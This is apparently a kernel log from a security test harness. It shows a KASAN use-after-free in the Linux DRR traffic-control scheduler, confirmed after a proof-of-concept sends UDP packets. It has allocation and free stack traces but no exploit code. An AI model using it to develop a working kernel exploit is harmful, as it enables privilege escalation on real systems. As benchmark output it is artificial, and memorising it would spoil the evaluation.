[    1.166512] RIP: 0033:0x43c213
[    1.166514] Code: 64 89 02 48 c7 c0 ff ff ff ff eb b7 66 2e 0f 1f 84 00 00 00 00 00 90 80 3d 71 fe 06 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    1.166516] RSP: 002b:00007fff6339b948 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    1.166519] RAX: ffffffffffffffda RBX: 00007fff6339b9a0 RCX: 000000000043c213
[    1.166521] RDX: 0000000000000001 RSI: 00007fff6339b955 RDI: 0000000000000004
[    1.166522] RBP: 0000000000000003 R08: 00007fff6339b970 R09: 0000000000000010
[    1.166523] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000001
[    1.166524] R13: 0000000000000004 R14: 00007fff6339b955 R15: 00007fff6339b970
[    1.166526]  </TASK>
[    1.166527] 
[    1.183242] Allocated by task 103:
[    1.183379]  kasan_save_stack+0x33/0x60
[    1.183532]  kasan_save_track+0x14/0x30
[    1.183685]  __kasan_kmalloc+0x8f/0xa0
[    1.183835]  drr_change_class+0x36d/0xb50
[    1.183994]  tc_ctl_tclass+0x470/0x1450
[    1.184147]  rtnetlink_rcv_msg+0x367/0xa40
[    1.184310]  netlink_rcv_skb+0x12e/0x370
[    1.184466]  netlink_unicast+0x5c0/0x830
[    1.184621]  netlink_sendmsg+0x75a/0xc00
[    1.184777]  __sys_sendto+0x3af/0x420
[    1.184928]  __x64_sys_sendto+0xdb/0x1b0
[    1.185084]  do_syscall_64+0xa6/0x1b0
[    1.185231]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.185429] 
[    1.185496] Freed by task 103:
[    1.185620]  kasan_save_stack+0x33/0x60
[    1.185773]  kasan_save_track+0x14/0x30
[    1.185927]  kasan_save_free_info+0x3b/0x60
[    1.186093]  __kasan_slab_free+0x37/0x50
[    1.186249]  kfree+0xcf/0x360
[    1.186372]  drr_delete_class+0x2c3/0x470
[    1.186531]  tc_ctl_tclass+0xfb9/0x1450
[    1.186684]  rtnetlink_rcv_msg+0x367/0xa40
[    1.186848]  netlink_rcv_skb+0x12e/0x370
[    1.187004]  netlink_unicast+0x5c0/0x830
[    1.187161]  netlink_sendmsg+0x75a/0xc00
[    1.187317]  __sys_sendto+0x3af/0x420
[    1.187463]  __x64_sys_sendto+0xdb/0x1b0
[    1.187620]  do_syscall_64+0xa6/0x1b0
[    1.187767]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.187966] 
[    1.188033] The buggy address belongs to the object at ffff888007c7cc00
[    1.188033]  which belongs to the cache kmalloc-128 of size 128
[    1.188506] The buggy address is located 96 bytes inside of
[    1.188506]  freed 128-byte region [ffff888007c7cc00, ffff888007c7cc80)
[    1.188968] 
[    1.189034] The buggy address belongs to the physical page:
[    1.189250] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x7c7c
[    1.189551] head: order:1 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[    1.189847] flags: 0x100000000000040(head|node=0|zone=1)
[    1.190055] page_type: f5(slab)
[    1.190184] raw: 0100000000000040 ffff888006c42a00 dead000000000122 0000000000000000
[    1.190481] raw: 0000000000000000 0000000080200020 00000000f5000000 0000000000000000
[    1.190779] head: 0100000000000040 ffff888006c42a00 dead000000000122 0000000000000000
[    1.191080] head: 0000000000000000 0000000080200020 00000000f5000000 0000000000000000
[    1.191380] head: 0100000000000001 ffffea00001f1f01 00000000ffffffff 00000000ffffffff
[    1.191681] head: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
[    1.191983] page dumped because: kasan: bad access detected
[    1.192199] 
[    1.192266] Memory state around the buggy address:
[    1.192454]  ffff888007c7cb00: 00 00 00 00 00 00 00 00 00 00 00 00 00 fc fc fc
[    1.192733]  ffff888007c7cb80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.193013] >ffff888007c7cc00: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.193292]                                                        ^
[    1.193542]  ffff888007c7cc80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.193823]  ffff888007c7cd00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.194102] ==================================================================
[    1.194387] Disabling lock debugging due to kernel taint
poc: sent second UDP packet (UAF trigger)
poc: done (no crash observed)
[    1.194983] poc (103) used greatest stack depth: 25856 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    1.516331] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[    2.462385] ACPI: PM: Preparing to enter system sleep state S5
[    2.462731] reboot: Power down
CONFIRMED: KASAN_UAF
